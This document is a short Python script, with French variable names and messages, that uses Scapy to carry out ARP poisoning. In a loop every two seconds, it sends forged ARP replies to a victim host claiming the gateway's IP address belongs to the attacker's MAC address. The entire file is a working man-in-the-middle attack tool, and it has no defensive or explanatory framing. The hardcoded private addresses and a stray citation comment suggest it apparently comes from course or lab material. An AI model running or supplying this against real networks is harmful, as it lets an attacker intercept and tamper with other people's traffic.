from scapy.all import * # [cite: 261]
import time

ip_hacker = "192.168.1.1"
mac_hacker = "40:a6:b7:ad:ea:08"
ip_victime = "192.168.1.2"
mac_victime = "40:a6:b7:dd:ec:46"
ip_passerelle = "192.168.1.254" 
mac_passerelle = "00:00:0C:11:22:33" 

def poisoning(mac_hacker, mac_victime, ip_passerelle, ip_victime):
    eth = Ether(dst=mac_victime)
    arp = ARP(op=2, psrc=ip_passerelle, hwsrc=mac_hacker, hwdst=mac_victime, pdst=ip_victime)
    trame = eth / arp
    sendp(trame, verbose=False) # 

def main():
    print(f"[*] Démarrage de l'ARP Poisoning sur {ip_victime}...")
    print(f"[*] Usurpation de l'identité de {ip_passerelle}")
    print("[*] Appuyez sur CTRL+C pour arrêter.")
    
    try:
        while True:
            poisoning(mac_hacker, mac_victime, ip_passerelle, ip_victime) # 
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[!] Arrêt de l'attaque.")

if __name__ == "__main__":
    main()